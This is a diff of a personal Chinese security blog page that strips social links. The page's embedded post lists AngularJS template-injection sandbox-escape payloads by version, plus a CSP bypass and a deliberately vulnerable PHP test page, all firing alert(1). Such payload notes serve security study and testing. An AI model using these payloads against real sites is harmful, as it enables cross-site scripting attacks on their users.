@@ -11,7 +11,7 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"js没好好学，先记下payload，留着以后用\n12345678910111213&lt;html ng-app&gt;&lt;head&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        $q = $_GET[&apos;q&apos;];        echo htmlspecialchars($q,ENT_QUOTES);    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\npaylaodv1.0.1-v1.1.51?q=&#123;&#123; constructor.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.0-v1.2.181?q=&#123;&#123; a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.19-v1.2.231?q=&#123;&#123; toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)  &#125;&#125;\n\nv1.2.24-v1.2.26\nv1.2.27-v1.2.29/v1.3.0-v1.3.201?q=&#123;&#123; &#123;&#125;.&quot;)));alert(1)//&quot;; &#125;&#125;\n\n实际测试为v1.2.20-v1.2.32/v1.3.0-v1.3.20均生效。\nv1.4.0-v1.4.5（仅chrome）1?q=&#123;&#123; o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;; &#125;&#125;\n\nv1.4.5-1.5.8 （仅chrome）1?q=&#123;&#123; x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos; &#125;&#125;\n\nv1.6.0-1.6.61?q=&#123;&#123; [].pop.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\ncsp bypass （仅chrome v1.4.0-v1.6.6）123456789101112131415&lt;html ng-app&gt;&lt;head&gt;    &lt;?php        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);    ?&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        echo $_GET[&apos;q&apos;];    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\n1?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;\n\n","dateCreated":"2019-10-29T19:21:24+08:00","dateModified":"2019-10-29T19:31:59+08:00","datePublished":"2019-10-29T19:21:24+08:00","description":"","headline":"Angularjs模板注入","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/29/Angularjs模板注入/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/10/29/Angularjs模板注入/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"js没好好学，先记下payload，留着以后用\n12345678910111213&lt;html ng-app&gt;&lt;head&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        $q = $_GET[&apos;q&apos;];        echo htmlspecialchars($q,ENT_QUOTES);    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\npaylaodv1.0.1-v1.1.51?q=&#123;&#123; constructor.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.0-v1.2.181?q=&#123;&#123; a=&apos;constructor&apos;;b=&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&apos;alert(1)&apos;)() &#125;&#125;\n\nv1.2.19-v1.2.231?q=&#123;&#123; toString.constructor.prototype.toString=toString.constructor.prototype.call;[&quot;a&quot;,&quot;alert(1)&quot;].sort(toString.constructor)  &#125;&#125;\n\nv1.2.24-v1.2.26\nv1.2.27-v1.2.29/v1.3.0-v1.3.201?q=&#123;&#123; &#123;&#125;.&quot;)));alert(1)//&quot;; &#125;&#125;\n\n实际测试为v1.2.20-v1.2.32/v1.3.0-v1.3.20均生效。\nv1.4.0-v1.4.5（仅chrome）1?q=&#123;&#123; o=&#123;&#125;;l=o[[&apos;__lookupGetter__&apos;]];(l=l)(&apos;event&apos;)().target.defaultView.location=&apos;javascript:alert(1)&apos;; &#125;&#125;\n\nv1.4.5-1.5.8 （仅chrome）1?q=&#123;&#123; x=&#123;y:&apos;&apos;.constructor.prototype&#125;;x.y.charAt=[].join;[1]|orderBy:&apos;x=alert(1)&apos; &#125;&#125;\n\nv1.6.0-1.6.61?q=&#123;&#123; [].pop.constructor(&apos;alert(1)&apos;)() &#125;&#125;\n\ncsp bypass （仅chrome v1.4.0-v1.6.6）123456789101112131415&lt;html ng-app&gt;&lt;head&gt;    &lt;?php        header(&quot;Content-Security-Policy:default-src &apos;self&apos;;script-src code.angularjs.org &apos;self&apos;&quot;);    ?&gt;    &lt;script src=&quot;https://code.angularjs.org/&#123;version&#125;/angular.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;p&gt;    &lt;?php        echo $_GET[&apos;q&apos;];    ?&gt;&lt;/p&gt;   &lt;/body&gt;&lt;/html&gt;\n\n1?q=&lt;input+autofocus ng-focus=&quot;$event.path|orderBy:&apos;!x?[].constructor.from([x=1],alert):0&apos;&quot;&gt;\n\n","dateCreated":"2019-10-29T19:21:24+08:00","dateModified":"2019-10-29T19:31:59+08:00","datePublished":"2019-10-29T19:21:24+08:00","description":"","headline":"Angularjs模板注入","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/29/Angularjs模板注入/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/10/29/Angularjs模板注入/"}</script>
     <meta name="description" content="js没好好学，先记下payload，留着以后用 12345678910111213&amp;lt;html ng-app&amp;gt;&amp;lt;head&amp;gt;    &amp;lt;script src=&amp;quot;https://code.angularjs.org/&amp;#123;version&amp;#125;/angular.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="Angularjs模板注入">
@@ -166,138 +166,6 @@
                         >
                         <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                         <span class="sidebar-button-desc">关于</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://github.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="GitHub"
-                        >
-                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">GitHub</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="http://stackoverflow.com/users"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Stack Overflow"
-                        >
-                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Stack Overflow</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://twitter.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Twitter"
-                        >
-                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Twitter</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://facebook.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Facebook"
-                        >
-                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Facebook</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://plus.google.com/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="Google Plus"
-                        >
-                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">Google Plus</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="https://www.linkedin.com/profile/"
-                            
-                                target="_blank"
-                            
-                            rel="noopener"
-                            title="LinkedIn"
-                        >
-                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">LinkedIn</span>
-                    </a>
-            </li>
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/mailto"
-                            
-                            rel="noopener"
-                            title="邮箱"
-                        >
-                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">邮箱</span>
-                    </a>
-            </li>
-            
-        </ul>
-        
-            <ul class="sidebar-buttons">
-            
-                <li class="sidebar-button">
-                    
-                        <a
-                            class="sidebar-button-link "
-                            href="/atom.xml"
-                            
-                            rel="noopener"
-                            title="RSS"
-                        >
-                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
-                        <span class="sidebar-button-desc">RSS</span>
                     </a>
             </li>
             
